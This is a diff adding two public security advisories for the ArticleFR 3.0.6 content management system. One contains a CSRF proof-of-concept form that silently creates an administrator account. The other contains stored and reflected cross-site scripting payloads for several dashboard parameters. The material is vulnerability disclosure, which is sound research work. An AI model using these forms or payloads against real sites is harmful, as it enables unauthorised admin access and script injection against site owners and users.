@@ -1,0 +1,131 @@
+﻿
+ArticleFR 3.0.6 CSRF Add Admin Exploit
+
+
+Vendor: Free Reprintables
+Product web page: http://www.freereprintables.com
+Affected version: 3.0.6
+
+Summary: A lightweight fully featured content (article / video)
+management system. Comes with a pluginable and multiple module
+framework system.
+
+Desc: The application allows users to perform certain actions
+via HTTP requests without performing any validity checks to
+verify the requests. This can be exploited to perform certain
+actions with administrative privileges if a logged-in user
+visits a malicious web site.
+
+Tested on: nginx/1.6.2
+           PHP
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5248
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5248.php
+
+
+21.06.2015
+
+--
+
+
+<html>
+  <body>
+    <form action="http://127.0.0.1/dashboard/users/create/" method="POST">
+      <input type="hidden" name="username" value="thricer" />
+      <input type="hidden" name="name" value="The_Hacker" />
+      <input type="hidden" name="password" value="s3cr3t" />
+      <input type="hidden" name="email" value="lab@zeroscience.mk" />
+      <input type="hidden" name="website" value="http://www.zeroscience.mk" />
+      <input type="hidden" name="blog" value="zsl" />
+      <input type="hidden" name="membership" value="admin" />
+      <input type="hidden" name="isactive" value="active" />
+      <input type="hidden" name="submit" value="Create" />
+      <input type="submit" value="Request" />
+    </form>
+  </body>
+</html>
+
+##################################################################
+
+
+ArticleFR 3.0.6 Multiple Script Injection Vulnerabilities
+
+
+Vendor: Free Reprintables
+Product web page: http://www.freereprintables.com
+Affected version: 3.0.6
+
+Summary: A lightweight fully featured content (article / video)
+management system. Comes with a pluginable and multiple module
+framework system.
+
+Desc: ArticleFR suffers from multiple stored cross-site scripting
+vulnerabilities. The issues are triggered when input passed via the
+POST parameter 'name' in Categories, POST parameters 'title' and
+'rel' in Links and GET parameter 'url' in PingServers module is
+not properly sanitized before being returned to the user. This can
+be exploited to execute arbitrary HTML and script code in a user's
+browser session in context of an affected site.
+
+Tested on: nginx/1.6.2
+           PHP
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2015-5247
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5247.php
+
+
+21.06.2015
+
+--
+
+
+POST 'name' Categories Stored XSS:
+----------------------------------
+<html>
+  <body>
+    <form action="http://127.0.0.1/dashboard/settings/categories/" method="POST">
+      <input type="hidden" name="name" value='"><script>alert(1)</script>' />
+      <input type="hidden" name="parent" value="0" />
+      <input type="hidden" name="submit" value="Add" />
+      <input type="submit" value="XSS #1" />
+    </form>
+  </body>
+</html>
+
+
+POST 'title', 'rel' Links Stored XSS:
+------------------------------------
+<html>
+  <body>
+    <form action="http://127.0.0.1/dashboard/settings/links/" method="POST">
+      <input type="hidden" name="title" value='"><script>alert(2)</script>' />
+      <input type="hidden" name="url" value="http://www.zeroscience.mk" />
+      <input type="hidden" name="rel" value='"><script>alert(3)</script>' />
+      <input type="hidden" name="submit" value="Add" />
+      <input type="submit" value="XSS #2 and #3" />
+    </form>
+  </body>
+</html>
+
+
+POST 'url' Ping Server Reflected XSS:
+-------------------------------------
+<html>
+  <body>
+    <form action="http://127.0.0.1/dashboard/tools/pingservers/" method="POST">
+      <input type="hidden" name="url" value='http://www.zeroscience.mk"><script>alert(4)</script>' />
+      <input type="hidden" name="submit" value="Add" />
+      <input type="submit" value="XSS #4" />
+    </form>
+  </body>
+</html>
